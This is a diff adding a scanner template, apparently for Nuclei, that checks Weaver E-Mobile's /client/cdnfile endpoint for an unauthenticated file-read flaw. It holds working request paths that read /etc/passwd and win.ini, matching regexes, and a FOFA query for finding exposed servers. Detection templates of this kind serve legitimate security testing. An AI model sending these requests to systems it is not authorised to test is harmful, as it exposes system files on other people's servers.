@@ -1,0 +1,33 @@
+id: weaver-emobile-client-fileread
+
+info:
+  name: 泛微 E-Mobile /client/cdnfile 任意文件读取
+  author: clearx
+  severity: high
+  description: |
+    泛微 E-Mobile /client/cdnfile 接口可未授权读取 Linux /etc/passwd 或 Windows win.ini。
+  reference:
+    - https://mp.weixin.qq.com/s/ESqrOqA8LFq8GHj0TJ1rLA
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="泛微-EMobile"
+  tags: weaver,emobile,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/client/cdnfile/C/etc/passwd?linux"
+      - "{{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
+      - type: status
+        status:
+          - 200
